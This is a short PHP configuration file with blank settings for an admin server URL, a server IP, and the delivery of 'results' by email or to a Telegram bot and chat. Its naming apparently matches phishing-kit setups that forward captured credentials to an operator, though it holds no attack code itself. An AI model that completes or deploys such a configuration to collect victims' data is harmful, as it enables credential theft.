<?php
	$AdminServer = ''; //The admin server Url
	$WServerIP = '';
	$ResultsEmail = 'off'; //on;
	$ResultsEmailTo = ''; //Your email
	$ResultsTelegram = 'on'; //off
	$ResultsTelegramBotApi = ''; //Your bot telegram api
	$ResultsTelegramChatID = ''; //Your Group/Channel/Your Chatid
?>